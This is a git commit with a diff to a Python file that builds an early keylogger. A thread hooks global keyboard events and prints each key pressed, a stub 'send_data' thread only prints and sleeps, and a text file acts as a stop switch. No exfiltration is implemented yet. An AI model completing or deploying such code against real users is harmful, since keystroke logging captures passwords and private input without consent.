f4200c88cccd66118710fbdcc3eda40631420308
vitaliishchudlo <vitalik.shchudlo01@ukr.net>
2021-05-30 15:48:42 +0300

    working structure

--- main.py
+++ main.py
@@ -7,30 +7,65 @@ import time
 
 class App():
     def __init__(self):
-        pass
+        self.kill_send_info = False
+        self.kill_keyboard = False
+
+        self.th1 = Thread(target=self.start_keylogger)
+        self.th2 = Thread(target=self.send_data)
 
 
     def send_data(self):
-        print('sending data first')
-        time.sleep(3)
+        if self.kill_send_info == True:
+            print('Sending data was stopped')
+            sys.exit()
+        else:
+            print('sending data first')
+            time.sleep(3)
+            self.send_data()
+
+
+
+    def get_keyboard_pressed(self, e):
+        if e.event_type == 'up':
+            print(f'You pressed: {e.name}')
+
 
     def start_keylogger(self):
-        print('none')
+        if self.kill_keyboard == False:
+            keyboard.hook(self.get_keyboard_pressed)
+            # keyboard.wait()
+        else:
+            print('EXITING')
+            sys.exit()
 
 
     def check_params(self):
         with open('test.txt', 'r') as file:
             result = file.read()
             if result == 'stop':
-                print('stoper')
-                time.sleep(1)
-                self.check_params()
+                self.kill_keyboard = True
+                self.kill_send_info = True
+                sys.exit()
             else:
-                print('working')
-                time.sleep(1)
+                print('Flags are working.')
+                time.sleep(1.5)
                 self.check_params()
 
-        # with open("test.txt", "r") as f:
+
+
+    def run(self):
+        self.th1.start()
+        self.th2.start()
+        self.check_params()
+
+
+if __name__ == '__main__':
+    LoadKeyboardLayout('00000409', 1)
+    App().run()
+
+
+
+# with open("test.txt", "r") as f:
         #     text = f.read()
         #     if text == '1':
         #         print(f'like: {text}')
@@ -38,21 +73,3 @@ class App():
         #         self.smel()
         #     else:
         #         sys.exit()
-
-    def run(self):
-        th1 = Thread(target=self.start_keylogger)
-        th2 = Thread(target=self.send_data)
-        th1.start()
-        th2.start()
-
-        self.check_params()
-
-
-
-
-        input('\n\nPress ENTER to exit')
-
-
-if __name__ == '__main__':
-    LoadKeyboardLayout('00000409', 1)
-    App().run()
